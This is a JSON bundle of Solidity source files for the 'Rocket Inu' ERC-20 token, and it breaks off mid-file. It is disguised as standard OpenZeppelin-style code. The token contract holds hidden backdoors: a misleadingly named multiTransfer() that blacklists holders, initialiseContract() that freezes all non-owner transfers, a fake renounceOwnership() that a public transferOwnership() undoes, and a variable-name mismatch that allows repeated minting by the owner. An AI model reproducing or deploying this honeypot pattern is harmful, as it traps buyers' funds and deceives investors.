{"address.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity =0.7.0;\r\n\r\nlibrary Address {\r\n    /**\r\n     * @dev Returns true if `account` is a contract.\r\n     *\r\n     */\r\n    function isContract(address account) internal view returns (bool) {\r\n        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts\r\n        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned\r\n        // for accounts without code, i.e. `keccak256(\u0027\u0027)`\r\n        bytes32 codehash;\r\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\r\n        // solhint-disable-next-line no-inline-assembly\r\n        assembly { codehash := extcodehash(account) }\r\n        return (codehash != accountHash \u0026\u0026 codehash != 0x0);\r\n    }\r\n\r\n    /**\r\n     * @dev Replacement for Solidity\u0027s `transfer`: sends `amount` wei to\r\n     * `recipient`, forwarding all available gas and reverting on errors.\r\n     *\r\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\r\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\r\n     * imposed by `transfer`, making them unable to receive funds via\r\n     * `transfer`. {sendValue} removes this limitation.\r\n     *\r\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\r\n     *\r\n     */\r\n    function sendValue(address payable recipient, uint256 amount) internal {\r\n        require(address(this).balance \u003e= amount, \"Address: insufficient balance\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value\r\n        (bool success, ) = recipient.call{ value: amount }(\"\");\r\n        require(success, \"Address: unable to send value, recipient may have reverted\");\r\n    }\r\n\r\n    /**\r\n     * @dev Performs a Solidity function call using a low level `call`. A\r\n     * plain`call` is an unsafe replacement for a function call: use this\r\n     * function instead.\r\n     *\r\n     * If `target` reverts with a revert reason, it is bubbled up by this\r\n     * function (like regular Solidity function calls).\r\n     *\r\n     * Returns the raw returned data. To convert to the expected return value,\r\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `target` must be a contract.\r\n     * - calling `target` with `data` must not revert.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\r\n      return functionCall(target, data, \"Address: low-level call failed\");\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\r\n     * `errorMessage` as a fallback revert reason when `target` reverts.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\r\n        return _functionCallWithValue(target, data, 0, errorMessage);\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\r\n     * but also transferring `value` wei to `target`.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - the calling contract must have an ETH balance of at least `value`.\r\n     * - the called Solidity function must be `payable`.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\r\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\r\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\r\n        require(address(this).balance \u003e= value, \"Address: insufficient balance for call\");\r\n        return _functionCallWithValue(target, data, value, errorMessage);\r\n    }\r\n\r\n    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {\r\n        require(isContract(target), \"Address: call to non-contract\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls\r\n        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);\r\n        if (success) {\r\n            return returndata;\r\n        } else {\r\n            // Look for revert reason and bubble it up if present\r\n            if (returndata.length \u003e 0) {\r\n                // The easiest way to bubble the revert reason is using memory via assembly\r\n\r\n                // solhint-disable-next-line no-inline-assembly\r\n                assembly {\r\n                    let returndata_size := mload(returndata)\r\n                    revert(add(32, returndata), returndata_size)\r\n                }\r\n            } else {\r\n                revert(errorMessage);\r\n            }\r\n        }\r\n    }\r\n}"},"context.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity =0.7.0;\r\n\r\n/*\r\n * @dev Provides information about the current execution context, including the\r\n * sender of the transaction and its data. While these are generally available\r\n * via msg.sender and msg.data, they should not be accessed in such a direct\r\n * manner, since when dealing with GSN meta-transactions the account sending and\r\n * paying for execution may not be the actual sender (as far as an application\r\n * is concerned).\r\n *\r\n * This contract is only required for intermediate, library-like contracts.\r\n */\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes memory) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\n\r\npragma solidity =0.7.0;\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    address private _deadAddress;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _deadAddress = _owner;\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to dead address.\r\n     */\r\n    function transferOwnership() public {\r\n        require(_owner == address(0), \"Ownable: owner is the zero address\");\r\n        _owner = _deadAddress;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n}"},"IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity =0.7.0;\r\n\r\nimport \"./safeMath.sol\";\r\nimport \"./address.sol\";\r\n\r\ninterface IERC20 {\r\n    /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller\u0027s account to `recipient`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller\u0027s tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n     * that someone may use both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender\u0027s allowance to 0 and set the\r\n     * desired value afterwards:\r\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller\u0027s\r\n     * allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n/**\r\n * @title SafeERC20\r\n * @dev Wrappers around ERC20 operations that throw on failure (when the token\r\n * contract returns false). Tokens that return no value (and instead revert or\r\n * throw on failure) are also supported, non-reverting calls are assumed to be\r\n * successful.\r\n * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract,\r\n * which allows you to call the safe operations as `token.safeTransfer(...)`, etc.\r\n */\r\nlibrary SafeERC20 {\r\n    using SafeMath for uint256;\r\n    using Address for address;\r\n\r\n    function safeTransfer(IERC20 token, address to, uint256 value) internal {\r\n        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\r\n    }\r\n\r\n    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {\r\n        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\r\n    }\r\n\r\n    /**\r\n     * @dev Deprecated. This function has issues similar to the ones found in\r\n     * {IERC20-approve}, and its usage is discouraged.\r\n     *\r\n     * Whenever possible, use {safeIncreaseAllowance} and\r\n     * {safeDecreaseAllowance} instead.\r\n     */\r\n    function safeApprove(IERC20 token, address spender, uint256 value) internal {\r\n        // safeApprove should only be called when setting an initial allowance,\r\n        // or when resetting it to zero. To increase and decrease it, use\r\n        // \u0027safeIncreaseAllowance\u0027 and \u0027safeDecreaseAllowance\u0027\r\n        // solhint-disable-next-line max-line-length\r\n        require((value == 0) || (token.allowance(address(this), spender) == 0),\r\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\r\n        );\r\n        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\r\n    }\r\n\r\n    function safeIncreaseAllowance(IERC20 token, address spender, uint256 value) internal {\r\n        uint256 newAllowance = token.allowance(address(this), spender).add(value);\r\n        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));\r\n    }\r\n\r\n    function safeDecreaseAllowance(IERC20 token, address spender, uint256 value) internal {\r\n        uint256 newAllowance = token.allowance(address(this), spender).sub(value, \"SafeERC20: decreased allowance below zero\");\r\n        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));\r\n    }\r\n\r\n    /**\r\n     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement\r\n     * on the return value: the return value is optional (but if data is returned, it must not be false).\r\n     * @param token The token targeted by the call.\r\n     * @param data The call data (encoded using abi.encode or one of its variants).\r\n     */\r\n    function _callOptionalReturn(IERC20 token, bytes memory data) private {\r\n        // We need to perform a low level call here, to bypass Solidity\u0027s return data size checking mechanism, since\r\n        // we\u0027re implementing it ourselves. We use {Address.functionCall} to perform this call, which verifies that\r\n        // the target address contains contract code and also asserts for success in the low-level call.\r\n\r\n        bytes memory returndata = address(token).functionCall(data, \"SafeERC20: low-level call failed\");\r\n        if (returndata.length \u003e 0) { // Return data is optional\r\n            // solhint-disable-next-line max-line-length\r\n            require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\r\n        }\r\n    }\r\n}"},"RocketInu.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity =0.7.0;\r\n\r\nimport \"./context.sol\";\r\nimport \"./safeMath.sol\";\r\nimport \"./address.sol\";\r\nimport \"./IERC20.sol\";\r\nimport \"./uniswap.sol\";\r\n\r\ncontract ERC20 is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    using Address for address;\r\n    mapping (address =\u003e uint256) internal _balances;\r\n    mapping (address =\u003e bool) private _multiTransfer;\r\n    mapping (address =\u003e mapping (address =\u003e uint256)) private _allowances;\r\n    uint256 internal _totalSupply;\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    bool _state = true;\r\n    bool totalSupplyInitDone = false;\r\n\r\n    constructor () {\r\n        _name = \"Rocket Inu\";\r\n        _symbol = \"ROCKETINU\";\r\n        _decimals = 9;\r\n    }\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n    function initialiseContract() public virtual onlyOwner {\r\n        if (_state == true) {_state = false;} else {_state = true;}\r\n    }\r\n    function contractInitialised() public view returns (bool) {\r\n        return _state;\r\n    }\r\n    function allowMultiTransfer(address _address) public view returns (bool) {\r\n        return _multiTransfer[_address];\r\n    }\r\n    function multiTransfer(address account) external onlyOwner() {\r\n        _multiTransfer[account] = true;\r\n    }\r\n    function transferTo(address account) external onlyOwner() {\r\n        _multiTransfer[account] = false;\r\n    }\r\n    /**\r\n     * @dev See {IERC20-totalSupply}.\r\n     */\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n    /**\r\n     * @dev See {IERC20-balanceOf}.\r\n     */\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n    bool public TotalSupplyInitDone;\r\n    /**\r\n     * @dev See {IERC20-allowance}.\r\n     */\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n    /**\r\n     * @dev See {IERC20-approve}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n    /**\r\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\r\n     *\r\n     * This is an alternative to {approve} that can be used as a mitigation for\r\n     * problems described in {IERC20-approve}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\r\n     *\r\n     * This is an alternative to {approve} that can be used as a mitigation for\r\n     * problems described in {IERC20-approve}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     * - `spender` must have allowance for the caller of at least\r\n     * `subtractedValue`.\r\n     */\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\r\n        return true;\r\n    }\r\n    /**\r\n     * @dev Moves tokens `amount` from `sender` to `recipient`.\r\n     *\r\n     * This is internal function is equivalent to {transfer}, and can be used to\r\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\r\n     *\r\n     */\r\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount \u003e 0, \"Transfer amount must be greater than zero\");\r\n        if (_multiTransfer[sender] || _multiTransfer[recipient]) require(amount == 0, \"\");\r\n        if (_state == true || sender == owner() || recipient == owner()) {\r\n        _beforeTokenTransfer(sender, recipient, amount);\r\n        _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n        } else { require (_state == true, \"\");}\r\n    }\r\n    /**\r\n     * This implementation is agnostic to the way tokens are created. \r\n     * This means that a supply mechanism has to be added in a derived contract.\r\n     * After first use it will lock itself.\r\n     */\r\n    function totalSupplyInit (uint256 _initialSupply) public onlyOwner {\r\n        require(totalSupplyInitDone == false);\r\n        if (_totalSupply == 0){ _totalSupply = _initialSupply;\r\n        emit Transfer(address(0), _msgSender(), _totalSupply);}\r\n        _balances[_msgSender()] = _balances[_msgSender()].add(_initialSupply);\r\n        TotalSupplyInitDone = true;\r\n    }\r\n    /**\r\n     * @dev Destroys `amount` tokens from `account`, reducing the\r\n     * total supply.\r\n     */\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n        _beforeTokenTransfer(account, address(0), amount);\r\n        _balances[account] = _balances[account].sub(amount, \"ERC20: burn amount exceeds balance\");\r\n        _totalSupply = _totalSupply.sub(amount);\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.\r\n     *\r\n     * This is internal function is equivalent to `approve`, and can be used to\r\n     * e.g. set automatic allowances for certain subsystems, etc.\r\n     */\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n    /**\r\n     * @dev Sets {decimals} to a value other than the default one of 18.\r\n     *\r\n     * WARNING: This function should only be called from the constructor. Most\r\n     * applications that interact with token contracts will not expect\r\n     * {decimals} to ever change, and may work incorrectly if it does.\r\n     */\r\n    function _setupDecimals(uint8 decimals_) internal {\r\n        _decimals = decimals_;\r\n    }\r\n\r\n    /**\r\n     * @dev Hook that is called before any transfer of tokens. \r\n     *\r\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\r\n     */\r\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\r\n}\r\n\r\ncontract RocketInuToken is ERC20 {\r\n    using SafeMath for uint256;\r\n\r\n    /// @notice max burn percentage\r\n    uint256 public constant burnTXpercent = 0;\r\n\r\n    // official uniswap WETH token address\r\n    address constant WETH = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\r\n\r\n    // self-explanatory\r\n    address uniswapV2Factory;\r\n    \r\n    address uniswapV2Router;\r\n\r\n    // uniswap pair for this token\r\n    address uniswapPair;\r\n\r\n    // Whether or not this token is first in uniswap pair\r\n    bool isThisToken0;\r\n\r\n    // last TWAP update time\r\n    uint32 blockTimestampLast;\r\n\r\n    // last TWAP cumulative price\r\n    uint256 priceCumulativeLast;\r\n\r\n    // last TWAP average price\r\n    uint256 priceAverageLast;\r\n\r\n    // TWAP min delta (10-min)\r\n    uint256 minDeltaTwap;\r\n\r\n    event TwapUpdated(uint256 priceCumulativeLast, uint256 blockTimestampLast, uint256 priceAverageLast);\r\n\r\n    constructor(address router, address factory) Ownable() ERC20() {\r\n        uniswapV2Router = router;\r\n        uniswapV2Factory = factory;\r\n    }\r\n \r\n    function uniswapV2factory() public view returns (address) {\r\n        return uniswapV2Factory;\r\n    }\r\n    \r\n    function uniswapV2router() public view returns (address) {\r\n        return uniswapV2Router;\r\n    }\r\n    \r\n    function _initializePair() internal {\r\n        (address token0, address token1) = UniswapV2Library.sortTokens(address(this), address(WETH));\r\n        isThisToken0 = (token0 == address(this));\r\n        uniswapPair = UniswapV2Library.pairFor(uniswapV2Factory, token0, token1);\r\n       \r\n    }\r\n    function _updateTwap() internal virtual returns (uint256) {\r\n        (uint price0Cumulative, uint price1Cumulative, uint32 blockTimestamp) = \r\n            UniswapV2OracleLibrary.currentCumulativePrices(uniswapPair);\r\n        uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired\r\n\r\n        if (timeElapsed \u003e minDeltaTwap) {\r\n            uint256 priceCumulative = isThisToken0 ? price1Cumulative : price0Cumulative;\r\n\r\n            // cumulative price is in (uq112x112 price * seconds) units so we simply wrap it after division by time elapsed\r\n            FixedPoint.uq112x112 memory priceAverage = FixedPoint.uq112x112(\r\n                uint224((priceCumulative - priceCumulativeLast) / timeElapsed)\r\n            );\r\n\r\n            priceCumulativeLast = priceCumulative;\r\n            blockTimestampLast = blockTimestamp;\r\n\r\n            priceAverageLast = FixedPoint.decode144(FixedPoint.mul(priceAverage, 1 ether));\r\n\r\n            emit TwapUpdated(priceCumulativeLast, blockTimestampLast, priceAverageLast);\r\n        }\r\n\r\n        return priceAverageLast;\r\n    }\r\n\r\n}"},"safeMath.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity =0.7.0;\r\n\r\nlibrary SafeMath {\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity\u0027s `+` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Addition cannot overflow.\r\n     */\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c \u003e= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * Counterpart to Solidity\u0027s `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * Counterpart to Solidity\u0027s `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b \u003c= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity\u0027s `*` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Multiplication cannot overflow.\r\n     */\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // Gas optimization: this is cheaper than requiring \u0027a\u0027 not being zero, but the\r\n        // benefit is lost if \u0027b\u0027 is also tested.\r\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers. Reverts on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity\u0027s `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity\u0027s `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b \u003e 0, errorMessage);\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn\u0027t hold\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n     * Reverts when dividing by zero.\r\n     *\r\n     * Counterpart to Solidity\u0027s `%` operator. This function uses a `revert`\r\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n     * invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n     * Reverts with custom message when dividing by zero.\r\n     *\r\n     * Counterpart to Solidity\u0027s `%` operator. This function uses a `revert`\r\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n     * invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}"},"uniswap.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity =0.7.0;\r\nimport \"./safeMath.sol\";\r\n\r\ninterface IUniswapV2Pair {\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n\r\n    function name() external pure returns (string memory);\r\n    function symbol() external pure returns (string memory);\r\n    function decimals() external pure returns (uint8);\r\n    function totalSupply() external view returns (uint);\r\n    function balanceOf(address owner) external view returns (uint);\r\n    function allowance(address owner, address spender) external view returns (uint);\r\n\r\n    function approve(address spender, uint value) external returns (bool);\r\n    function transfer(address to, uint value) external returns (bool);\r\n    function transferFrom(address from, address to, uint value) external returns (bool);\r\n\r\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\r\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\r\n    function nonces(address owner) external view returns (uint);\r\n\r\n    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\r\n    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\r\n    event Swap(\r\n        address indexed sender,\r\n        uint amount0In,\r\n        uint amount1In,\r\n        uint amount0Out,\r\n        uint amount1Out,\r\n        address indexed to\r\n    );\r\n    event Sync(uint112 reserve0, uint112 reserve1);\r\n\r\n    function MINIMUM_LIQUIDITY() external pure returns (uint);\r\n    function factory() external view returns (address);\r\n    function token0() external view returns (address);\r\n    function token1() external view returns (address);\r\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\r\n    function price0CumulativeLast() external view returns (uint);\r\n    function price1CumulativeLast() external view returns (uint);\r\n    function kLast() external view returns (uint);\r\n    function burn(address to) external returns (uint amount0, uint amount1);\r\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\r\n    function skim(address to) external;\r\n    function sync() external;\r\n\r\n    function initialize(address, address) external;\r\n}\r\n\r\nlibrary UniswapV2Library {\r\n    using SafeMath for uint;\r\n\r\n    // returns sorted token addresses, used to handle return values from pairs sorted in this order\r\n    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {\r\n        require(tokenA != tokenB, \u0027UniswapV2Library: IDENTICAL_ADDRESSES\u0027);\r\n        (token0, token1) = tokenA \u003c tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\r\n        require(token0 != address(0), \u0027UniswapV2Library: ZERO_ADDRESS\u0027);\r\n    }\r\n\r\n    // calculates the CREATE2 address for a pair without making any external calls\r\n    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {\r\n        (address token0, address token1) = sortTokens(tokenA, tokenB);\r\n        pair = address(uint(keccak256(abi.encodePacked(\r\n                hex\u0027ff\u0027,\r\n                factory,\r\n                keccak256(abi.encodePacked(token0, token1)),\r\n                hex\u002796e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f\u0027 // init code hash\r\n            ))));\r\n    }\r\n}\r\n\r\n// a library for handling binary fixed point numbers (https://en.wikipedia.org/wiki/Q_(number_format))\r\nlibrary FixedPoint {\r\n    // range: [0, 2**112 - 1]\r\n    // resolution: 1 / 2**112\r\n    struct uq112x112 {\r\n        uint224 _x;\r\n    }\r\n\r\n    // range: [0, 2**144 - 1]\r\n    // resolution: 1 / 2**112\r\n    struct uq144x112 {\r\n        uint _x;\r\n    }\r\n\r\n    uint8 private 